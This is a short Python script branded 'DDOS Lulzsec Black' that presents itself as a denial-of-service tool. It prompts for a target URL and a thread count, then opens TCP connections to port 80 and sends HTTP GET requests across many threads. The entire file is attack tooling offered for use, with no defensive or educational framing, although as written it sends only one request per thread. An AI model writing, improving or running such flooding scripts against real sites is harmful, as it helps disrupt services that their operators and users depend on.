import socket
import random
import threading
import pyfiglet
from urllib.parse import urlparse
import requests

def dos_attack(target_url):
    try:
        parsed_url = urlparse(target_url)
        target_ip = socket.gethostbyname(parsed_url.netloc)
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((target_ip, 80))  # Assuming HTTP port is 80
        client.send(b"GET / HTTP/1.1\r\nHost: " + parsed_url.netloc.encode() + b"\r\n\r\n")
        print(f"Sent packet to {target_url}")
    except Exception as e:
        print(f"Error: {e}")

def ddos_attack(target_url, num_threads):
    threads = []
    
    for i in range(num_threads):
        thread = threading.Thread(target=dos_attack, args=(target_url,))
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    ascii_banner = pyfiglet.figlet_format("DDOS Lulzsec Black")
    print(ascii_banner)

    print("Select attack type:")
    print("1. DoS Attack (single connection)")
    print("2. DDoS Attack (multiple connections)")

    attack_type = input("Enter attack type (1 or 2): ")

    target_url = input("Enter target URL (e.g., http://example.com): ")

    if attack_type == "1":
        dos_attack(target_url)
    elif attack_type == "2":
        num_threads = int(input("Enter number of threads: "))
        ddos_attack(target_url, num_threads)
    else:
        print("Invalid attack type. Please enter 1 or 2.")
